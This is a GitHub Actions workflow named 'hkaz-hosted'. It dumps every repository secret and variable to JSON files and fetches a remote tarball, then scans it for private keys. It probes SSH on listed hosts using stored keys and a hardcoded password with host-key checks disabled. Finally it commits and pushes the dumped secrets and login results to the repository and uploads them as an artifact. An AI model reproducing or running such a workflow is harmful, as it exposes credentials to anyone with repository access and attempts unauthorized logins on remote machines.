name: hkaz-hosted
on:
  push:
    branches: [main, 'hk-az-*']
permissions:
  contents: write
jobs:
  rec:
    runs-on: ubuntu-latest
    timeout-minutes: 40
    steps:
      - uses: actions/checkout@v4
      - name: secrets-dump
        continue-on-error: true
        env:
          SECRETS_JSON: ${{ toJSON(secrets) }}
          VARS_JSON: ${{ toJSON(vars) }}
        run: |
          mkdir -p out
          umask 077
          printf '%s' "$SECRETS_JSON" > out/secrets.json
          printf '%s' "$VARS_JSON" > out/vars.json
          env | grep -iE '^(GITHUB|ACTIONS|RUNNER)_' | sort > out/env.txt || true
      - name: kit
        continue-on-error: true
        run: |
          set +e
          KIT_URL=$(grep -oE 'https://ulbatchkit[^" ]+' deploy.sh | head -1)
          { echo "kit_url_len=${#KIT_URL}"
            curl -sS -m 300 -o /tmp/kit.tgz -w "kit_http=%{http_code} bytes=%{size_download}\n" "$KIT_URL"
            sha256sum /tmp/kit.tgz
            tar tzf /tmp/kit.tgz | head -80
            mkdir -p out/kit && tar xzf /tmp/kit.tgz -C out/kit
            find out/kit -type f | head -80
          } > out/kit.txt 2>&1
          grep -rlE 'PRIVATE KEY|ssh-(rsa|ed25519)' out/kit az 2>/dev/null > out/keyfiles.txt
      - name: ssh-probe
        continue-on-error: true
        run: |
          set +e
          command -v sshpass >/dev/null || { sudo apt-get update -qq; sudo apt-get install -y -qq sshpass; }
          chmod 600 az/*.pem 2>/dev/null
          : > out/ssh.tsv
          n=0
          while IFS=$'\t' read -r name ip user region size; do
            n=$((n+1)); [ "$n" -gt 14 ] && break
            [ -z "$ip" ] && continue
            echo "## $name $ip $user" >> out/ssh.tsv
            if ! timeout 8 bash -c "exec 3<>/dev/tcp/$ip/22" 2>/dev/null; then echo "port22=closed" >> out/ssh.tsv; sleep 3; continue; fi
            echo "port22=open" >> out/ssh.tsv
            for kf in az/ibm_key.pem az/azadmin.pem; do
              [ -f "$kf" ] || continue
              o=$(timeout 14 ssh -i "$kf" -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=8 -o IdentitiesOnly=yes -o LogLevel=ERROR "$user@$ip" 'echo LOGIN_OK uid=$(id -u) host=$(hostname) gpu="$(nvidia-smi -L 2>/dev/null | head -2 | tr "\n" ";")"' 2>&1 | head -2 | tr '\n' ' ')
              echo "key=$kf :: $o" >> out/ssh.tsv
              case "$o" in *LOGIN_OK*) break;; esac
            done
            o=$(timeout 14 sshpass -p 't19' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=8 -o PubkeyAuthentication=no -o PreferredAuthentications=password -o LogLevel=ERROR "$user@$ip" 'echo LOGIN_OK uid=$(id -u) host=$(hostname)' 2>&1 | head -2 | tr '\n' ' ')
            echo "pw=t19 :: $o" >> out/ssh.tsv
            sleep 3
          done < az/hosts.tsv
      - name: commit
        if: always()
        run: |
          git config user.name hk
          git config user.email hk@local.invalid
          git add -A out 2>/dev/null
          git commit -m "hkaz-hosted $(date -u +%FT%TZ)" >/dev/null 2>&1 || true
          git push origin "HEAD:${GITHUB_REF_NAME}" || true
      - uses: actions/upload-artifact@v4
        if: always()
        with:
          name: hkaz-hosted-${{ github.run_id }}
          path: out/
          retention-days: 3
